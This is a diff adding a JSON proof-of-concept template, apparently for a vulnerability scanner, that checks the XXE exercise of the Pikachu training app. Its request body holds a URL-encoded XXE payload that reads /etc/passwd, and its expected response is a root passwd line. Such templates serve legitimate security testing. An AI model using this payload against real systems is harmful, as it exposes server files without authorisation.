@@ -1,0 +1,26 @@
+{
+    "name": "pikachu",
+    "vuln": "XXE",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/xxe/xxe_1.php",
+                "cookie": "",
+                "requestheader": {"Content-Type": "application/x-www-form-urlencoded"},
+                "requestbody": "xml=%3C%3Fxml+version%3D%221.0%22%3F%3E+%3C%21DOCTYPE+ANY+%5B++++++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E+%5D%3E+%3Ca%3E%26xxe%3B%3C%2Fa%3E&submit=提交"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "[+] 存在XXE漏洞",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "root:x:0:0:root:/root:/bin/bash"
+            }
+        }
+    }
+}
